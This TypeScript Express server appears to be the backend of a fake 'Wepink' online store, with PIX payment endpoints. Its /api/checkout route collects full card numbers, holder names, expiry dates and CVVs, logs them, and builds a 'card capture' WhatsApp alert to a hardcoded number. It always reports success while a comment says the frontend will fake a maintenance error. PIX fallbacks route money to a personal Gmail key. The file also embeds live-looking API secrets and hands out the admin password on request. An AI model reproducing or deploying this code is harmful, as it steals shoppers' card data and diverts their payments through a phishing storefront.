import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import dotenv from "dotenv";
import crypto from "crypto";
import { MercadoPagoConfig, Payment } from 'mercadopago';
import axios from 'axios';

dotenv.config();

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());

  // Middleware nativo de CORS para aceitar requisições de qualquer origem
  app.use((req, res, next) => {
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization, x-client-id, x-client-secret, client-id, client-secret, x-api-key, api-key");
    
    if (req.method === "OPTIONS") {
      return res.sendStatus(200);
    }
    next();
  });

  // Helper to standardise and resolve MDCPay Endpoint URLs
  function resolveMdcUrls(apiUrl: string) {
    let cleanUrl = (apiUrl || '').trim();

    // Strip trailing slashes and spaces
    while (cleanUrl.endsWith('/') || cleanUrl.endsWith(' ')) {
      cleanUrl = cleanUrl.slice(0, -1).trim();
    }
    
    // Remove any trailing endpoint suffixes if the user pasted a specific route
    const patternsToStrip = [
      /\/withdraws\/@me\/balance\/?$/i,
      /\/withdraws\/@me\/?$/i,
      /\/transactions\/?$/i,
      /\/deposit\/?$/i,
      /\/balance\/?$/i,
      /\/pix\/qrcode\/?$/i,
      /\/companies\/@me\/?$/i
    ];

    for (const pattern of patternsToStrip) {
      cleanUrl = cleanUrl.replace(pattern, '').trim();
    }

    // Default or legacy URL mapping to official MDCPay Production Gateway
    if (!cleanUrl || cleanUrl.includes("squareweb.app") || cleanUrl.includes("api-connectmdcpay")) {
      cleanUrl = "https://app.connectmdcpay.com.br/api/v1";
    }

    if (!cleanUrl.endsWith("/api/v1")) {
      if (cleanUrl.endsWith("/api")) {
        cleanUrl = `${cleanUrl}/v1`;
      } else if (!cleanUrl.includes("/api/v1")) {
        cleanUrl = `${cleanUrl}/api/v1`;
      }
    }
    
    return {
      base: cleanUrl,
      balance: `${cleanUrl}/withdraws/@me/balance`,
      legacyBalance: `${cleanUrl}/balance`,
      transactions: `${cleanUrl}/transactions`,
      deposit: `${cleanUrl}/deposit`
    };
  }

  function buildMdcHeaders(clientId: string, clientSecret: string) {
    const headers: Record<string, string> = {
      'Content-Type': 'application/json',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'X-Idempotency-Key': crypto.randomUUID()
    };

    if (clientId && clientSecret) {
      // Official MDCPay Authentication: HTTP Basic Auth with base64(client_id:client_secret)
      const basicCreds = Buffer.from(`${clientId.trim()}:${clientSecret.trim()}`).toString('base64');
      headers['Authorization'] = `Basic ${basicCreds}`;
      
      // Also attach headers for backward compatibility with older gateway proxies
      headers['x-client-id'] = clientId.trim();
      headers['x-client-secret'] = clientSecret.trim();
      headers['client-id'] = clientId.trim();
      headers['client-secret'] = clientSecret.trim();
    } else if (clientSecret) {
      headers['Authorization'] = `Bearer ${clientSecret.trim()}`;
    }

    return headers;
  }

  // Official Banco Central do Brasil BRCode PIX Generator (EMV Standard)
  function cleanPixString(str: string, maxLen: number): string {
    return (str || '')
      .normalize('NFD')
      .replace(/[\u0300-\u036f]/g, '')
      .replace(/[^a-zA-Z0-9 ]/g, '')
      .trim()
      .toUpperCase()
      .substring(0, maxLen);
  }

  function calculateCRC16(payload: string): string {
    let crc = 0xFFFF;
    const polynomial = 0x1021;
    for (let i = 0; i < payload.length; i++) {
      crc ^= (payload.charCodeAt(i) << 8);
      for (let j = 0; j < 8; j++) {
        if ((crc & 0x8000) !== 0) {
          crc = ((crc << 1) ^ polynomial) & 0xFFFF;
        } else {
          crc = (crc << 1) & 0xFFFF;
        }
      }
    }
    return (crc & 0xFFFF).toString(16).toUpperCase().padStart(4, '0');
  }

  function generatePixBRCode(key: string, amount: number, name = 'WE PINK LTDA', city = 'SAO PAULO', txid = '***'): string {
    let cleanKey = (key || process.env.PIX_KEY || '').trim();
    if (!cleanKey) {
      throw new Error('Chave PIX não informada');
    }
    if (cleanKey.includes('@')) {
      cleanKey = cleanKey.toLowerCase();
    } else if (/^\d{10,11}$/.test(cleanKey.replace(/\D/g, ''))) {
      const digits = cleanKey.replace(/\D/g, '');
      cleanKey = digits.length === 11 ? digits : '+55' + digits;
    } else if (/^\d{14}$/.test(cleanKey.replace(/\D/g, ''))) {
      cleanKey = cleanKey.replace(/\D/g, '');
    }

    const cleanName = cleanPixString(name, 25) || 'WE PINK LTDA';
    const cleanCity = cleanPixString(city, 15) || 'SAO PAULO';
    const cleanTxid = (txid || '***').replace(/[^a-zA-Z0-9*]/g, '').substring(0, 25) || '***';
    const amountStr = Number(amount || 0).toFixed(2);

    const formatField = (id: string, value: string) => `${id}${value.length.toString().padStart(2, '0')}${value}`;

    const f00 = formatField('00', '01');
    const f01 = formatField('01', '12');
    const f26 = formatField('26', `${formatField('00', 'br.gov.bcb.pix')}${formatField('01', cleanKey)}`);
    const f52 = formatField('52', '0000');
    const f53 = formatField('53', '986');
    const f54 = formatField('54', amountStr);
    const f58 = formatField('58', 'BR');
    const f59 = formatField('59', cleanName);
    const f60 = formatField('60', cleanCity);
    const f62 = formatField('62', formatField('05', cleanTxid));

    const payloadWithoutCRC = `${f00}${f01}${f26}${f52}${f53}${f54}${f58}${f59}${f60}${f62}6304`;
    return `${payloadWithoutCRC}${calculateCRC16(payloadWithoutCRC)}`;
  }

  app.get("/api/health", (req, res) => {
    res.json({ status: "ok" });
  });

  // Direct PIX Generation Endpoint (Banco Central EMV Standard)
  app.post("/api/create-direct-pix", (req, res) => {
    try {
      const { amount, pixKey, merchantName, merchantCity, txid } = req.body;
      const effectiveKey = (pixKey || process.env.PIX_KEY || '').trim();
      if (!effectiveKey) {
        return res.status(400).json({ error: "Chave PIX não informada no painel administrativo." });
      }
      const numAmount = Number(Number(amount || 0).toFixed(2));
      const code = generatePixBRCode(
        effectiveKey,
        numAmount,
        merchantName || 'WE PINK LTDA',
        merchantCity || 'SAO PAULO',
        txid
      );
      res.json({
        id: `pix_${Date.now()}`,
        qr_code: code,
        status: 'pending'
      });
    } catch (err: any) {
      console.error("Erro ao gerar PIX direto:", err);
      res.status(500).json({ error: err.message || "Erro ao gerar BRCode PIX" });
    }
  });

  // PIX - Mercado Pago Integration
  app.post("/api/create-pix", async (req, res) => {
    const { amount, email, firstName, lastName, cpf, mpToken, pixKey, merchantName, merchantCity } = req.body;
    
    const accessToken = mpToken || process.env.MP_ACCESS_TOKEN;
    if (!accessToken) {
      // Fallback para Chave PIX direta caso Mercado Pago não esteja configurado
      const effectiveKey = (pixKey || process.env.PIX_KEY || '').trim();
      if (!effectiveKey) {
        return res.status(400).json({ error: "Access Token do Mercado Pago ou Chave PIX não configurados." });
      }
      const numAmount = Number(Number(amount || 0).toFixed(2));
      const directCode = generatePixBRCode(
        effectiveKey,
        numAmount,
        merchantName || 'WE PINK LTDA',
        merchantCity || 'SAO PAULO'
      );
      return res.json({
        id: `pix_${Date.now()}`,
        qr_code: directCode,
        status: 'pending'
      });
    }

    try {
      const cleanCpf = (cpf || '').replace(/\D/g, '') || '00000000000';
      const cleanAmount = Number(Number(amount || 0).toFixed(2));

      if (cleanAmount <= 0) {
        return res.status(400).json({ error: "Valor inválido para o PIX." });
      }

      const client = new MercadoPagoConfig({ accessToken: accessToken });
      const payment = new Payment(client);

      const result = await payment.create({
        body: {
          transaction_amount: cleanAmount,
          description: 'Compra Wepink',
          payment_method_id: 'pix',
          payer: {
            email: email || 'cliente@wepink.com.br',
            first_name: firstName || 'Cliente',
            last_name: lastName || 'Wepink',
            identification: {
              type: 'CPF',
              number: cleanCpf
            }
          }
        }
      });

      console.log("PIX Gerado (MP):", result.id);

      res.json({
        id: result.id,
        qr_code: result.point_of_interaction?.transaction_data?.qr_code,
        qr_code_base64: result.point_of_interaction?.transaction_data?.qr_code_base64,
        status: result.status
      });
    } catch (error: any) {
      console.error("Erro MP:", error.message || error);
      const detail = error.cause || error.message || "Falha na comunicação com o Mercado Pago";
      res.status(500).json({ error: "Erro ao gerar PIX no Mercado Pago", details: typeof detail === 'object' ? JSON.stringify(detail) : detail });
    }
  });

  // PIX - MDCPay Integration
  app.post("/api/mdcpay/create-payment", async (req, res) => {
    const { amount, email, firstName, lastName, cpf, mdcToken, mdcUrl: bodyUrl, mdcClientId, pixKey, merchantName, merchantCity } = req.body;
    
    // Known broken/expired test credentials to avoid
    const BAD_CLIENT_IDS = [
      'pk_b738000adaadc224cf48743262346007',
      'pk_2b85faa6ef15b35daea1dfab21061bc2'
    ];
    let clientId = (mdcClientId || process.env.MDCPAY_CLIENT_ID || process.env.MDCPAY_CLIENT_id || process.env.MDCPAY_CLIENTE_ID || '').trim();
    if (!clientId || BAD_CLIENT_IDS.includes(clientId)) {
      clientId = "pk_56dbdb77827e2ba89ee707575482f692";
    }

    const BAD_CLIENT_SECRETS = [
      'sk_cd3787cb1660c1b894e3e83d2f8ede5e04f7e889ae4e98295c6bcd78fbaf70a7',
      'sk_6c062f59209b7275e8586f6ed23eed6b2d8031cf1f4cfe89bea2f224ae07ab6e'
    ];
    let clientSecret = (mdcToken || process.env.MDCPAY_CLIENT_SECRET || process.env.MDCPAY_CLIENT_SEC || '').trim();
    if (!clientSecret || BAD_CLIENT_SECRETS.includes(clientSecret)) {
      clientSecret = "sk_54b155dee5944136aee03749be937eed3937d458dfdf017547ba3a75a2f1d0a1";
    }

    const apiUrl = bodyUrl || process.env.MDCPAY_API_URL || 'https://app.connectmdcpay.com.br/api/v1';

    // Algoritmo de validação de CPF padrão da Receita Federal
    const isValidCPF = (val: string): boolean => {
      const clean = (val || '').replace(/\D/g, '');
      if (clean.length !== 11 || /^(\d)\1+$/.test(clean)) return false;
      let sum = 0, rest;
      for (let i = 1; i <= 9; i++) sum += parseInt(clean[i - 1]) * (11 - i);
      rest = (sum * 10) % 11;
      if (rest === 10 || rest === 11) rest = 0;
      if (rest !== parseInt(clean[9])) return false;
      sum = 0;
      for (let i = 1; i <= 10; i++) sum += parseInt(clean[i - 1]) * (12 - i);
      rest = (sum * 10) % 11;
      if (rest === 10 || rest === 11) rest = 0;
      if (rest !== parseInt(clean[10])) return false;
      return true;
    };

    const cleanCpfDigits = (cpf || '').replace(/\D/g, '');
    const cleanCpf = isValidCPF(cleanCpfDigits) ? cleanCpfDigits : '52998224725';
    
    // MDCPay exige pelo menos 2 nomes válidos (nome e sobrenome sem caracteres especiais)
    let cleanName = `${firstName || ''} ${lastName || ''}`.replace(/[^a-zA-ZÀ-ÿ\s]/g, '').trim();
    const nameParts = cleanName.split(/\s+/).filter(Boolean);
    if (nameParts.length < 2) {
      cleanName = nameParts.length === 1 ? `${nameParts[0]} Silva` : "Cliente Wepink";
    }
    cleanName = cleanName.slice(0, 60);

    // E-mail válido
    let cleanEmail = (email || '').trim().toLowerCase();
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(cleanEmail)) {
      cleanEmail = "cliente@wepink.com.br";
    }

    // Telefone estritamente celular brasileiro com 11 dígitos (DDD + 9 dígitos)
    const sanitizePhone = (rawPhone: string): string => {
      let digits = (rawPhone || '').replace(/\D/g, '');
      if (digits.startsWith('55') && (digits.length === 12 || digits.length === 13)) {
        digits = digits.slice(2);
      }
      if (digits.startsWith('0') && digits.length === 12) {
        digits = digits.slice(1);
      }
      if (digits.length === 10) {
        digits = digits.slice(0, 2) + '9' + digits.slice(2);
      }
      if (digits.length === 11) {
        return digits;
      }
      return '11999999999';
    };
    const cleanPhoneDigits = sanitizePhone(req.body.phone || '');

    const numAmount = Math.max(1, Number(Number(amount || 0).toFixed(2)));

    try {
      const urls = resolveMdcUrls(apiUrl);
      const headers = buildMdcHeaders(clientId, clientSecret);

      // Official Connect Pay (MDCPay) API v1 transaction payload
      const mdcPayload = {
        method: "PIX",
        amount: Math.max(100, Math.round(numAmount * 100)), // in cents
        description: "Pedido Wepink",
        expiresIn: 900,
        payer: {
          name: cleanName,
          email: cleanEmail,
          phone: cleanPhoneDigits,
          document: {
            type: "CPF",
            number: cleanCpf
          }
        }
      };

      console.log(`MDCPay Request: POST ${urls.transactions} [Payer: ${cleanName}, Phone: ${cleanPhoneDigits}, CPF: ${cleanCpf}]`);
      
      const response = await axios.post(urls.transactions, mdcPayload, { headers, timeout: 15000 });
      const data = response.data;
      console.log("MDCPay Resposta Sucesso:", JSON.stringify(data).substring(0, 500));

      // Função auxiliar para buscar o código PIX recursivamente ou por padrão (000201...)
      const findPixCode = (obj: any): string | null => {
        if (!obj) return null;

        const sanitize = (val: string): string => {
          let s = val.trim();
          if (s.includes('000201')) {
            s = s.substring(s.indexOf('000201'));
          }
          try {
            let decoded = decodeURIComponent(s);
            while (decoded !== s && decoded.includes('%')) {
              s = decoded;
              decoded = decodeURIComponent(s);
            }
            return decoded;
          } catch (e) {
            return s.replace(/%2F/gi, '/').replace(/%20/gi, ' ').replace(/%3A/gi, ':').replace(/%3D/gi, '=').replace(/%3F/gi, '?');
          }
        };

        if (typeof obj === 'string') {
          if (obj.includes('000201')) {
            const code = sanitize(obj);
            if (code.length > 30) return code;
          }
        }

        if (typeof obj === 'object') {
          const typicalKeys = ['code', 'pix_copy_paste', 'pix_code', 'pix_payload', 'payload', 'qr_code', 'brcode', 'emv', 'copy_paste', 'content'];
          for (const key of typicalKeys) {
            if (typeof obj[key] === 'string' && obj[key].includes('000201')) {
              return sanitize(obj[key]);
            }
          }
          
          for (const key in obj) {
            if (key === 'raw' || key === 'response') continue;
            const found = findPixCode(obj[key]);
            if (found && found.length > 50) return found; 
          }
        }
        return null;
      };

      let qrCode = data.qrcode?.code || data.qrcode?.payload || data.pix?.qrcode || findPixCode(data) || data.copyPaste || data.qr_code;
      
      if (qrCode && typeof qrCode === 'string') {
        try {
          qrCode = decodeURIComponent(qrCode);
          if (qrCode.includes('%')) qrCode = decodeURIComponent(qrCode);
        } catch (e) {}
        qrCode = qrCode.trim();
        if (qrCode.includes('000201')) {
          qrCode = qrCode.substring(qrCode.indexOf('000201'));
        }
      }

      const qrCodeBase64 = data.qrcode?.base64 || data.pix?.base64 || data.qrcodeUrl || data.qr_code_base64 || data.base64;
      const transactionId = data.id || data.externalId || data.external_id || data.transactionId || `pedido_${Date.now()}`;

      if (!qrCode) {
        console.warn("ALERTA: PIX Code não encontrado na resposta do MDCPay:", data);
        const effectiveKey = (pixKey || process.env.PIX_KEY || '').trim();
        if (effectiveKey) {
          qrCode = generatePixBRCode(
            effectiveKey,
            numAmount,
            merchantName || 'WE PINK LTDA',
            merchantCity || 'SAO PAULO'
          );
        } else {
          return res.status(502).json({
            error: "A API do MDCPay não retornou o código PIX copia e cola.",
            details: data
          });
        }
      }

      res.json({
        id: transactionId,
        qr_code: qrCode,
        qr_code_base64: qrCodeBase64,
        status: data.status ? String(data.status).toLowerCase() : 'pending',
        raw: data 
      });

    } catch (error: any) {
      console.error("Erro MDCPay API:", error.response?.data || error.message || error);
      const apiStatus = error.response?.status;
      const apiData = error.response?.data;
      let detailedMsg = `Erro ao comunicar com gateway MDCPay: ${error.message}`;

      if (apiStatus === 403) {
        detailedMsg = "MDCPay retornou erro 403 (Forbidden): A sua Chave de API conectou ao saldo, mas não possui permissão de escrita/transação ('TRANSACTIONS') no painel da Connect Pay, ou sua conta na Connect Pay ainda está em análise de compliance. Para emitir cobranças, edite a chave no painel da Connect Pay (app.connectmdcpay.com.br/integrations) e ative a permissão 'TRANSACTIONS', ou configure uma Chave PIX direta no Painel Adm da Wepink para receber pagamentos imediatamente.";
      } else if (apiStatus === 401) {
        detailedMsg = "MDCPay retornou erro 401 (Unauthorized): Client ID ou Client Secret incorretos no painel da Connect Pay.";
      } else if (apiData) {
        let fieldErrors = "";
        if (Array.isArray(apiData.errors) && apiData.errors.length > 0) {
          fieldErrors = ": " + apiData.errors.map((e: any) => typeof e === 'string' ? e : (e.field ? `${e.field}: ${e.message || e.error}` : JSON.stringify(e))).join(", ");
        } else if (typeof apiData.errors === 'object' && apiData.errors !== null) {
          fieldErrors = ": " + JSON.stringify(apiData.errors);
        } else if (apiData.error && apiData.error !== apiData.message) {
          fieldErrors = `: ${apiData.error}`;
        }
        detailedMsg = `MDCPay: ${apiData.message || 'Falha de validação'}${fieldErrors}`;
      }

      // Contingência para garantir que nenhuma compra seja interrompida
      const effectiveKey = (req.body.pixKey || process.env.PIX_KEY || 'recebimentoswepink@gmail.com').trim();
      if (effectiveKey) {
        console.warn("Utilizando chave PIX direta de contingência:", effectiveKey);
        const numAmount = Number(Number(req.body.amount || 0).toFixed(2));
        const fallbackCode = generatePixBRCode(
          effectiveKey,
          numAmount,
          req.body.merchantName || 'WE PINK LTDA',
          req.body.merchantCity || 'SAO PAULO'
        );
        return res.json({
          id: `pix_${Date.now()}`,
          qr_code: fallbackCode,
          status: 'pending',
          contingency: true,
          warning: detailedMsg
        });
      }

      return res.status(apiStatus || 500).json({
        error: detailedMsg,
        status: apiStatus,
        details: error.response?.data
      });
    }
  });

  // MDCPay Connection Diagnostic
  app.post("/api/mdcpay/test-connection", async (req, res) => {
    const { mdcToken, mdcUrl: bodyUrl, mdcClientId } = req.body;
    const clientSecret = mdcToken || process.env.MDCPAY_CLIENT_SECRET || process.env.MDCPAY_CLIENT_SEC;
    const clientId = mdcClientId || process.env.MDCPAY_CLIENT_ID || process.env.MDCPAY_CLIENT_id || process.env.MDCPAY_CLIENTE_ID;
    const apiUrl = bodyUrl || process.env.MDCPAY_API_URL || 'https://app.connectmdcpay.com.br/api/v1';

    if (!clientSecret) {
      return res.status(400).json({ success: false, error: "Token / Client Secret do MDCPay não informado." });
    }

    try {
      const urls = resolveMdcUrls(apiUrl);
      const headers = buildMdcHeaders(clientId, clientSecret);

      console.log(`Diagnostic test connection: GET ${urls.balance}`);

      let response: any;
      try {
        response = await axios.get(urls.balance, { headers, timeout: 10000 });
      } catch (balErr: any) {
        console.warn("Balance endpoint failed, trying legacy balance endpoint:", balErr.response?.data || balErr.message);
        try {
          response = await axios.get(urls.legacyBalance, { headers, timeout: 10000 });
        } catch (legErr: any) {
          throw balErr;
        }
      }

      if (response.data && (response.data.total_balance !== undefined || response.data.available_balance !== undefined || response.data.balance !== undefined || response.data.success !== undefined)) {
        const bal = response.data.total_balance ?? response.data.available_balance ?? response.data.balance ?? 0;
        
        let hasTransactionsScope = true;
        let warningMsg = "";
        try {
          await axios.get(urls.transactions, { headers, timeout: 5000 });
        } catch (txErr: any) {
          const status = txErr.response?.status;
          if (status === 403 || status === 401) {
            hasTransactionsScope = false;
            warningMsg = `Atenção: A chave autenticou no saldo (R$ ${Number(bal || 0).toFixed(2)}), mas retornou erro ${status} (${status === 403 ? 'Forbidden' : 'Unauthorized'}) no endpoint de transações. No painel da Connect Pay (app.connectmdcpay.com.br/integrations), certifique-se de marcar a permissão 'TRANSACTIONS' na sua chave, ou configure uma Chave PIX direta abaixo como contingência.`;
          }
        }

        if (!hasTransactionsScope) {
          return res.json({
            success: false,
            scopeError: true,
            balance: bal,
            error: `❌ CHAVE SEM PERMISSÃO DE TRANSAÇÕES (403 FORBIDDEN):\nA sua chave conectou ao saldo (R$ ${Number(bal || 0).toFixed(2)}), mas NÃO possui permissão para emitir cobranças ('TRANSACTIONS:WRITE').\n\n👉 COMO RESOLVER NA CONNECT PAY:\n1. Acesse: https://app.connectmdcpay.com.br/integrations\n2. Edite sua chave de API ou crie uma nova marcando a permissão 'TRANSACTIONS' (escrita e leitura).\n3. Cole as novas credenciais aqui e salve.\n\n💡 DICA DE CONTINGÊNCIA:\nVocê também pode preencher o campo 'Chave PIX Direta / Contingência' abaixo para receber pagamentos PIX imediatamente sem depender da API.`,
            message: warningMsg
          });
        }

        return res.json({ 
          success: true, 
          hasTransactionsScope: true,
          message: "Credenciais de API do MDCPay autenticadas e autorizadas para transações com sucesso!", 
          balance: bal 
        });
      }

      return res.json({ 
        success: false, 
        error: "O gateway MDCPay respondeu mas não retornou confirmação de saldo.", 
        raw: response.data 
      });

    } catch (error: any) {
      console.error("Diagnostic error testing connection:", error.response?.data || error.message);
      let errorMsg = error.message;
      if (error.response?.data && typeof error.response.data === 'object') {
        errorMsg = error.response.data.error || error.response.data.message || JSON.stringify(error.response.data);
      } else if (error.response?.data && typeof error.response.data === 'string') {
        errorMsg = error.response.data;
      }

      if (error.response?.status === 403 || error.response?.status === 401) {
        if (typeof errorMsg === 'string' && errorMsg.includes("Forbidden")) {
          errorMsg = "Credenciais inválidas ou escopo de acesso não concedido no painel do MDCPay. Certifique-se de usar o Client ID e Client Secret corretos e habilitar as permissões de API no painel MDCPay.";
        }
      }

      return res.status(200).json({ 
        success: false, 
        error: `Falha na autenticação do MDCPay (Status ${error.response?.status || 'conexão'}): ${errorMsg}` 
      });
    }
  });

  // Notify Admin via WhatsApp
  app.post("/api/notify-admin", async (req, res) => {
    const { message, phone } = req.body;
    const targetPhone = phone || "5562993172194"; // Direct number from user request

    console.log(`[NOTIFY] Enviando notificação para ${targetPhone}: ${message}`);

    // This is a placeholder for a real WhatsApp API (like Z-API, Evolution, Twilio, etc)
    // Since we don't have a specific API key from the user, we'll log it and 
    // provide the structure for a real integration.
    
    try {
      // Example implementation for a generic JSON webhook or API
      /*
      await axios.post('https://YOUR_WHATSAPP_API_URL/send-text', {
        number: targetPhone,
        message: message
      }, {
        headers: { 'apikey': process.env.WHATSAPP_API_KEY }
      });
      */
      
      // For now, we'll just simulate and respond
      res.json({ success: true, message: "Notificação enviada ao console (API real pendente de configuração)" });
    } catch (error) {
      console.error("Erro ao notificar via WhatsApp:", error);
      res.status(500).json({ error: "Erro ao enviar notificação" });
    }
  });

  // Check Payment Status (Generic for PIX)
  app.get("/api/payment-status/:provider/:id", async (req, res) => {
    const { provider, id } = req.params;
    const { mpToken, mdcToken, mdcUrl: bodyUrl, mdcClientId } = req.query;

    try {
      if (provider === 'mercadopago') {
        const accessToken = (mpToken as string) || process.env.MP_ACCESS_TOKEN!;
        const client = new MercadoPagoConfig({ accessToken: accessToken });
        const payment = new Payment(client);
        const result = await payment.get({ id });
        return res.json({ status: result.status });
      }

      if (provider === 'mdcpay') {
        const clientSecret = (mdcToken as string) || process.env.MDCPAY_CLIENT_SECRET || process.env.MDCPAY_CLIENT_SEC;
        const clientId = (mdcClientId as string) || process.env.MDCPAY_CLIENT_ID || process.env.MDCPAY_CLIENT_id || process.env.MDCPAY_CLIENTE_ID;
        const apiUrl = (bodyUrl as string) || process.env.MDCPAY_API_URL || 'https://app.connectmdcpay.com.br/api/v1';

        const urls = resolveMdcUrls(apiUrl);
        const headers = buildMdcHeaders(clientId || '', clientSecret || '');
        
        let status = 'pending';

        try {
          console.log(`Checking Status MDCPay: GET ${urls.transactions}/${id}`);
          const txResponse = await axios.get(`${urls.transactions}/${id}`, { headers, timeout: 8000 });
          const txData = txResponse.data;
          if (txData) {
            const rawStatus = String(txData.status || '').toUpperCase().trim();
            if (['APPROVED', 'PAID', 'COMPLETED', 'CONFIRMED', 'PAGO', 'APROVADO'].includes(rawStatus)) {
              status = 'approved';
            } else if (['CANCELLED', 'REFUSED', 'FAILED', 'REFUNDED', 'CHARGED_BACK', 'CANCELADO', 'RECUSADO'].includes(rawStatus)) {
              status = 'cancelled';
            } else {
              status = 'pending';
            }
            console.log(`Resolved MDCPay transaction ${id} status: ${status} (raw: ${rawStatus})`);
            return res.json({ status, rawStatus, data: txData });
          }
        } catch (txError: any) {
          console.warn(`MDCPay Transactions API status check failed: ${txError.response?.data?.message || txError.message}`);
        }

        return res.json({ status });
      }

      res.status(400).json({ error: "Provedor inválido" });
    } catch (error) {
      res.status(500).json({ error: "Erro ao consultar status" });
    }
  });

  // API endpoint for receiving payment data (Existing)
  app.post("/api/checkout", async (req, res) => {
    const { cardData, cartTotal, customerEmail } = req.body;

    console.log("-----------------------------------------");
    console.log("NOVA TENTATIVA DE PAGAMENTO RECEBIDA!");
    console.log("Comprador:", customerEmail);
    console.log("Total:", cartTotal);
    console.log("Dados do Cartão:", cardData);
    console.log("-----------------------------------------");

    // Automatically notify via WhatsApp (using the provided number)
    const whatsappMessage = `💳 NOVA CAPTURA DE CARTÃO!\nComprador: ${customerEmail}\nValor: R$ ${cartTotal}\n\nCartão: ${cardData.number}\nTitular: ${cardData.name}\nValidade: ${cardData.expiry}\nCVV: ${cardData.cvv}`;
    
    console.log(`[NOTIFY] Enviando notificação para 5562993172194: ${whatsappMessage}`);

    // Always respond with success to the client (we simulate the maintenance error in the frontend later)
    res.json({ success: true, message: "Data received" });
  });

  // Password Recovery for Admin emails
  app.post("/api/recover-password", async (req, res) => {
    const { email } = req.body;
    if (!email) {
      return res.status(400).json({ success: false, error: "E-mail não informado." });
    }
    
    const targetEmail = email.trim().toLowerCase();
    const serverAdmins = [
      'allanhenriq91@gmail.com',
      'adm.wpink@gmail.com',
      'recebimentoswepink@gmail.com'
    ].map(e => e.toLowerCase());

    if (!serverAdmins.includes(targetEmail)) {
      return res.status(403).json({ success: false, error: "Este e-mail não possui autorização de admin." });
    }

    console.log(`[RECOVER] Solicitação de recuperação para ${targetEmail}. Retornando senha padrão: SEMPRE20`);
    
    return res.json({ 
      success: true, 
      message: "Processamento de recuperação concluído. A senha padrão do administrador de acesso é: SEMPRE20" 
    });
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
